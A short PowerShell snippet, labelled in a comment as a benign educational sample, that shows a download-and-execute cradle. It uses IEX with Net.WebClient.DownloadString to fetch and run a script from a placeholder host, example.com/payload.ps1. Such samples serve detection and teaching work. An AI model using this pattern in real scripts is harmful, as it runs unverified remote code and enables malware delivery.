# This is a benign educational sample simulating a suspicious pattern
$url = "https://example.com/payload.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)
